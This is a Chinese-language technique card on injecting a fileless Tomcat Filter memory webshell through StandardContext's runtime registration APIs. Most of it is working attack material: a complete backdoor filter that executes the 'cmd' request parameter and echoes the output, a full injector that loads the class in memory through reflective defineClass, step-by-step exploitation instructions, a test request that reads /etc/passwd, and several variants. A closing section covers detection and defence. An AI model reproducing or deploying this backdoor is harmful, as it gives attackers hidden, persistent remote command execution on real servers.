---
id: web-java-component-tomcat-dynamic-filter-memshell
title: Tomcat 动态注册 Filter 内存马：StandardContext.addFilterDef/addFilterMapBefore/filterStart
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-standardcontext-filter-memshell
aliases:
- Tomcat Filter 内存马
- StandardContext 注入 Filter
- addFilterDef addFilterMapBefore
- filterStart 内存马
- 无文件 Tomcat WebShell
- cmd 参数 Filter 后门
tags:
- java
- tomcat
- memshell
- filter
- standardcontext
- defineclass
- persistence
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T02:27:42+08:00'
  notes: 已对照原文图04-07核对：Filter 继承 HttpFilter、cmd 参数执行、StandardContext 经 WebappClassLoaderBase.resources→StandardRoot 获取、defineClass 加载、addFilterDef/addFilterMapBefore/filterStart 注册、注入后 cmd 回显成功。前置条件（已能执行 Java 代码）已在触发条件中写明。原文未给 Tomcat 受影响版本区间，未设置 affected_versions。未复现 PoC。
---

## 一句话结论

在已能于 Tomcat Web 应用内执行 Java 代码的前提下，可以通过 `StandardContext` 的运行时 API 动态注册一个 Filter：构造 `FilterDef`（名称、Filter 实例或类名）、`FilterMap`（`/*` 映射），调用 `addFilterDef`、`addFilterMapBefore`、`filterStart`，即可让一个由 `ClassLoader#defineClass` 在内存中定义的恶意 Filter 对所有请求生效，实现无文件、重启即失效的内存 WebShell。

## 原理

- **StandardContext 的 Filter 容器**：Tomcat 的 `StandardContext` 保存 `filterDefs`（`Map<String, FilterDef>`）和 `filterMaps`（`FilterMap[]`）；`ApplicationFilterFactory` 在处理请求时根据 `filterMaps` 组装 `ApplicationFilterChain`。
- **运行时注册 API**：
  ```java
  context.addFilterDef(filterDef);          // 注册 Filter 定义
  context.addFilterMapBefore(filterMap);    // 把映射插到已有 filter 之前
  context.filterStart();                    // 初始化 Filter（调用 init）
  ```
  `FilterDef` 设置 `filterName`、`filter`（实例）、`filterClass`（类名）；`FilterMap` 设置 `filterName` 和 `addURLPattern("/*")`。`filterStart()` 会遍历 `filterDefs`，用 `ApplicationFilterConfig` 包装并初始化；若 `FilterDef` 中已有实例，则直接使用该实例。
- **恶意 Filter**：继承 `HttpFilter`（或实现 `Filter`），在 `doFilter` 中检查请求参数（如 `cmd`），存在则 `Runtime.exec` 并把输出写回响应；否则 `chain.doFilter` 保持正常业务。这样后门不改变正常页面行为，只响应特定参数。
- **内存类加载**：把恶意 Filter 编译成 class，Base64 后嵌入注入类；注入器用
  ```java
  Method m = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
  m.setAccessible(true);
  Class clazz = (Class) m.invoke(tccl, bytes, 0, bytes.length);
  Filter filter = (Filter) clazz.newInstance();
  ```
  直接把类定义在当前 Webapp ClassLoader 中，不落盘。`filterStart` 使用注入的实例，不依赖 `loadClass` 能否按名找到。
- **获取 StandardContext**：从当前线程上下文 ClassLoader 出发：
  ```text
  WebappClassLoaderBase
   → resources: StandardRoot
   → context: StandardContext
  ```
  也可以通过 `request.getServletContext()` 反射取 `ApplicationContext`/`StandardContext`，或从 Spring Boot 的 `ServletWebServerApplicationContext` 获取。
- **持久性**：注册发生在 JVM 内存中，随 Tomcat 进程重启消失；不产生 JSP/class 文件，传统文件查杀难以发现，但会出现在 `StandardContext.filterDefs`/`filterMaps` 中，可被运行时检测。

## 触发条件

- 目标为 Tomcat（原文 Tomcat 9.0.97、JDK 8），攻击者已获得在 Web 应用内执行 Java 代码的能力（反序列化、表达式注入、任意类加载等）。
- 能拿到 `StandardContext`（TCCL 为 `WebappClassLoaderBase` 且 `resources` 为 `StandardRoot`；嵌入式 Tomcat/不同版本字段可能不同）。
- 恶意 Filter 字节码与目标 JDK 兼容，依赖的 `javax.servlet`/`jakarta.servlet` API 与容器版本匹配（Tomcat 9 为 `javax.servlet`，Tomcat 10+ 为 `jakarta.servlet`）。
- 目标未对 `StandardContext.addFilterDef`/`filterStart` 做 RASP 拦截，且允许 `defineClass`。

## 利用步骤

1. 编写恶意 Filter：读取 `cmd` 参数，`Runtime.exec` 执行并回显；无参数时放行。
2. 编译为 class，Base64 编码（可再用 gzip 减小体积）。
3. 编写注入类（如 `Inject extends AbstractTranslet` 或任意可执行入口），在其中：
   - `getContext()`：TCCL → `resources` → `StandardRoot` → `getContext()` 得到 `StandardContext`；
   - `getFilter()`：Base64 解码 → `defineClass` → `newInstance`；
   - 构造 `FilterDef`/`FilterMap`，调用 `addFilterDef`/`addFilterMapBefore`/`filterStart`。
4. 通过反序列化/表达式等入口执行注入类（例如 Shiro `TemplatesImpl` 加载，见关联卡）。
5. 访问任意路径并带 `cmd=cat /etc/passwd`，验证命令执行；不带 `cmd` 时页面应保持正常。

## PoC

恶意 Filter：

```java
public class MemShell extends HttpFilter {
    @Override
    protected void doFilter(HttpServletRequest request, HttpServletResponse response,
                            FilterChain chain) throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = br.readLine()) != null) response.getWriter().println(line);
        } else {
            chain.doFilter(request, response);
        }
    }
}
```

注入器核心：

```java
public class Inject extends AbstractTranslet {
    String code = "<MemShell.class 的 Base64>";

    public StandardContext getContext() {
        WebappClassLoaderBase cl = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        try {
            Field f = WebappClassLoaderBase.class.getDeclaredField("resources");
            f.setAccessible(true);
            StandardRoot root = (StandardRoot) f.get(cl);
            return (StandardContext) root.getContext();
        } catch (Exception e) { return null; }
    }

    public Filter getFilter() throws Exception {
        byte[] bytes = Base64.getDecoder().decode(code);
        ClassLoader cl = Thread.currentThread().getContextClassLoader();
        Method m = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        m.setAccessible(true);
        Class clazz = (Class) m.invoke(cl, bytes, 0, bytes.length);
        return (Filter) clazz.newInstance();
    }

    public Inject() throws Exception {
        StandardContext context = getContext();
        Filter filter = getFilter();

        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName("shell");
        filterDef.setFilter(filter);
        filterDef.setFilterClass(filter.getClass().getName());

        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName("shell");
        filterMap.addURLPattern("/*");

        context.addFilterDef(filterDef);
        context.addFilterMapBefore(filterMap);
        context.filterStart();
        System.out.println("注入成功");
    }
}
```

请求验证：

```http
GET /login?cmd=cat%20/etc/passwd HTTP/1.1
Host: target:8080
```

返回 `/etc/passwd` 内容。原文本地环境在注入后响应 `load success, classInfo: Inject`，随后 `cmd=cat /etc/passwd` 成功。

## 变体与关联

- **映射顺序**：`addFilterMapBefore` 让内存马排在已有 Filter 之前；`addFilterMap` 追加在末尾，若前面的 Filter 提前 `return` 可能拦截不到，需按业务链选择。
- **内存马类型变体**：Servlet（`StandardContext.addServletMappingDecoded` + `Wrapper`）、Listener（`addApplicationLifecycleListener`）、Valve（`Pipeline.addValve`）、Spring MVC Controller（`RequestMappingHandlerMapping#registerMapping`）、WebFlux WebFilter（`FilteringWebHandler.chain`）。
- **获取 Context 变体**：从请求的 `ServletContext` 反射 `context` 字段；Spring Boot 嵌入式 Tomcat 可从 `ServletWebServerApplicationContext` 的 `webServer` → `TomcatWebServer` → `getTomcat().getHost()` 获取。
- **与 Shiro 两段式卡的关系**：`web-java-framework-shiro-rememberme-two-stage-memshell-loader` 负责把本卡的 `Inject` 类在两段式请求中送进内存；本卡负责 `Inject` 构造函数里的 Filter 注册。
- **与 Spring MVC/WebFlux 内存马卡的关系**：同一“无文件内存马”思路，注入点分别属于 Servlet 容器、Spring MVC、WebFlux 过滤器链。
- **Jakarta 命名空间**：Tomcat 10+ 使用 `jakarta.servlet.*`，编译恶意 Filter 时需匹配目标容器的 API，否则 `ClassNotFoundException`/`NoClassDefFoundError`。

## 检测与防御

- 运行时检测：`StandardContext.filterDefs` 新增未知 `filterName`/`filterClass`，`filterMaps` 中出现 `/*` 且来源非 web.xml/注解；`filterStart` 在运行期被调用；`ClassLoader#defineClass` 定义无 `CodeSource` 的类。
- 监控 TomcatEcho 反射链（`WebappClassLoaderBase.resources` → `StandardRoot.context` → `StandardContext`）与 `ClassLoader.defineClass` 调用；RASP 对 `addFilterDef`/`addFilterMapBefore`/`filterStart` 告警。
- 流量检测：同一 URL 带 `cmd`/`exec` 等参数、响应为命令输出；后门 Filter 不影响正常页面，需结合行为链。
- 防御：修复上游反序列化/表达式注入入口；部署 RASP/Java Agent 做内存马检测（扫描 FilterDef/Servlet/Listener/Valve 链）；限制 `defineClass` 与反射修改容器内部结构；进程重启可清除，但应在上线前完成排查。
- 排查：使用 arthas/copagent/java-memshell-scanner 等工具枚举 `StandardContext` 的 Filter/Servlet/Listener，核对来源与类加载器。
